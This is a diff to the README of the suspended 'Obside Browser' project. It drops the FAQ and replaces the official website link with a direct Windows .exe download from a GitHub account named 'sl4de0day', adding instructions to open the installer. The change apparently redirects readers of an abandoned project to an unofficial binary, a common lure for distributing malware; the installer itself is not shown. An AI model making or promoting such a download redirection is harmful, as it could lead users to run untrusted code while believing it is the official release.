@@ -1,11 +1,11 @@
- <div align="center">
-  <img src="https://avatars.githubusercontent.com/u/300243181?s=60&v=41" alt="Obside Browser" width="100">
+<div align="center">
+  <img src="https://avatars.githubusercontent.com/u/300243181?s=60&v=41" alt="Obside Browser Logo" width="100">
 
   # Obside Browser
 
   **A fast, private and secure way to explore the web.**
 
-  [Website](https://obsidebrowser.com/) · [Documentation](https://obsidebrowser.com/docs) · [Changelog](https://obsidebrowser.com/changelog) · [Contact](mailto:contact@obsidebrowser.com)
+  [Download](https://github.com/sl4de0day/obsidebrowser/releases/download/v150.1.0/obside-150.1.0.en-US.win64.installer.exe) · [Documentation](https://obsidebrowser.com/docs) · [Changelog](https://obsidebrowser.com/changelog) · [Website](https://obsidebrowser.com/) · [License](LICENSE)
 </div>
 
 ---
@@ -16,16 +16,16 @@ Obside combines built-in privacy protections, security-focused features, and a m
 
 > **Project Status — Suspended**
 >
-> Development of Obside Browser has been suspended as of July 2026. Active maintenance, support, and future updates are currently paused until further notice. Thank you to everyone who supported the project and showed interest in its development.
+> Development of Obside Browser has been suspended as of July 2026. Active maintenance, support, and future updates are paused until further notice. The website no longer provides downloads, but the existing Windows installer remains available through GitHub Releases.
 
 ## Features
 
-- **Privacy protection.** Built-in ad and tracker blocking, fingerprinting protection, and a privacy-first approach designed to minimize data collection.
-- **Performance.** Resource-conscious browsing with optimized page loading and memory management to improve responsiveness and reduce unnecessary CPU usage.
+- **Privacy protection.** Built-in ad and tracker blocking, fingerprinting protection, and a privacy-focused approach to browsing.
+- **Performance.** Resource-conscious browsing designed to improve responsiveness and reduce unnecessary CPU and memory usage.
 - **Security.** Security-focused browsing protections, including defenses against malicious websites and phishing attempts.
 - **Open source.** Publicly accessible source code that allows the community to inspect, review, and contribute to the project.
-- **Firefox extension support.** Support for standard WebExtensions, allowing users to customize their browsing experience with compatible extensions.
-- **Built-in updates.** An update interface designed to help users check for and install available browser updates.
+- **Firefox extension support.** Support for compatible standard WebExtensions.
+- **Built-in updates.** An update interface designed to check for and install available browser updates.
 - **Data import.** Options to import bookmarks, passwords, and browsing history from a previous browser.
 
 ## Obside Premium
@@ -33,47 +33,25 @@ Obside combines built-in privacy protections, security-focused features, and a m
 Obside Premium was designed as a subscription package intended to expand the browser's privacy, security, and communication capabilities.
 
 - **Advanced download security.** RAM-based protection and real-time malware scanning designed to inspect downloads before they are written to disk.
-- **Encrypted communication.** Enhanced video and audio communication with priority relays for improved connection quality.
-- **VPN service.** Access to a planned network of high-speed VPN servers with unlimited bandwidth.
-- **Encrypted file transfer.** End-to-end encrypted file sharing designed for transferring large files and folders without file-size restrictions.
+- **Encrypted communication.** Enhanced video and audio communication with priority relays.
+- **VPN service.** A planned network of high-speed VPN servers with unlimited bandwidth.
+- **Encrypted file transfer.** End-to-end encrypted file sharing designed for transferring large files and folders.
 
-*Premium feature descriptions reflect the project's intended offering and should not be interpreted as confirmation that these services are currently operational.*
+*Premium feature availability is not guaranteed while development is suspended.*
 
 ## Installation
 
-Obside Browser was developed for Windows.
+Obside Browser is available for Windows through its existing GitHub release installer.
 
-Due to the project's suspended development status, current downloads, installation instructions, and update availability may be limited. Check the [official website](https://obsidebrowser.com/) for any remaining project resources.
+**Download Obside Browser v150.1.0**
 
-## Frequently Asked Questions
+[Download Windows Installer (.exe)](https://github.com/sl4de0day/obsidebrowser/releases/download/v150.1.0/obside-150.1.0.en-US.win64.installer.exe)
 
-**How do I check for browser updates?**
+1. Download the Windows installer using the link above.
+2. Open the downloaded `.exe` file.
+3. Follow the installation instructions.
 
-In versions that support the update interface, navigate to `Settings > General > Obside Updates` and select **Check for updates**. Updates may no longer be available while development is suspended.
-
-**How does Obside protect my privacy?**
-
-Obside was designed with built-in ad and tracker blocking and fingerprinting protections, with an emphasis on minimizing telemetry and unnecessary data collection.
-
-**Does Obside support Firefox extensions?**
-
-Obside was designed to support standard WebExtensions, including compatible extensions from the official add-ons ecosystem.
-
-**Is Obside free?**
-
-The browser was designed to offer a free version alongside an optional Obside Premium subscription.
-
-**Can I import data from another browser?**
-
-Supported versions provide options to import bookmarks, passwords, and browsing history through the browser's setup process or settings.
-
-**Which platforms does Obside support?**
-
-Obside was available for Windows. Support for additional platforms was part of the project's future direction, but no release schedule is currently confirmed.
-
-**Do I need a separate ad blocker?**
-
-Obside was designed with built-in ad and tracker blocking, so a separate extension was not intended to be necessary for basic blocking functionality.
+> **Note:** Development and maintenance are suspended. The installer is an existing release and may not include subsequent security fixes. Use caution when installing or using unsupported software.
 
 ## Contact
 
